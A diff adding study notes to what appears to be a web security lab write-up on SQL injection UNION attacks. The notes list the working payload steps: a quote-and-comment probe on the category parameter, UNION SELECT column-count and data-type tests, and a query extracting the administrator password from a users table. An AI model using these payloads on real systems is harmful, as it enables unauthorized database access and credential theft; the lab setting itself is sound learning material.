@@ -183,7 +183,19 @@ Lab10: SQL injection UNION attack, retrieving multiple values in a single column
 
 GIVEN : The database contains a different table called users, with columns called username and password. 
 
+      -FIND THE VULNERABLE PARAMETERS
+      GET /filter?category=Lifestyle'--+ HTTP/2
 
+
+
+      -fIND THE NO. OF COLUMNS 
+      'UNION SELECT NULL,NULL --+
+
+      -FIND THE DATA TYPE OF COLUMNS
+      'UNION SELECT 'abc','def' --+
+
+      -FIND THE PASSWORD 
+      'UNION SELECT 'ABC',password from users where sername='administrator' --+
 
 
 
